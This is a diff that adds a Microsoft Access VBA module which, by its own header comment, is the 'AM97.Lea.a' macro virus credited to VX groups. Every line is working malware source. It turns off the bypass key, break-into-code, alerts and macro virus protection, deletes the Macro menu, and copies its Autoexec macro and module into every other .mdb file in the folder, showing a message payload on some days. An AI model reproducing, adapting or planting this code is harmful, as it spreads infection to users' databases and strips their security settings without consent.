@@ -1,0 +1,35 @@
+   Attribute VB_Name = "Lea"
+   Option Compare Database
+   Option Explicit
+   Function Lea()
+   'AM97.Lea.a
+   'by -KD- / [Metaphase VX Team] & [NoMercyVirusTeam]
+   On Error Resume Next
+   CommandBars("tools").Controls("Macro").Delete
+   CurrentDb.Properties("AllowBypassKey") = False
+   CurrentDb.Properties("AllowSpecialKeys") = False
+   CurrentDb.Properties("AllowBreakIntoCode") = False
+   Application.DisplayStatusBar = False
+   Application.DisplayAlerts = False
+   Application.MacrovirusProtection = False
+   Dim FilesToGet, FilesToInfect, CodeBase As String
+   FilesToInfect = False
+   FilesToGet = Dir("*.mdb", vbNormal)
+   If FilesToGet <> "" Then
+   CodeBase = CurrentDb.Name
+   If CodeBase = FilesToGet Then FilesToInfect = True
+   If FilesToInfect = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", FilesToGet, acMacro, "Autoexec", "Autoexec"
+   If FilesToInfect = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", FilesToGet, acModule, "lea", "lea"
+   While FilesToGet <> ""
+   FilesToGet = Dir
+   If CodeBase = FilesToGet Then FilesToInfect = True
+   If FilesToInfect = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", FilesToGet, acMacro, "Autoexec", "Autoexec"
+   If FilesToInfect = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", FilesToGet, acModule, "lea", "lea"
+   Wend
+   On Error GoTo Exit_Payload
+   If Day(Now()) = Int(Rnd() * 3) + 1 Then
+   MsgBox "AM97.Lea.a", "Welcome to this place, I'll Show you everything. With arms wide open."
+   End If
+   Exit_Payload:
+   End If
+   End Function
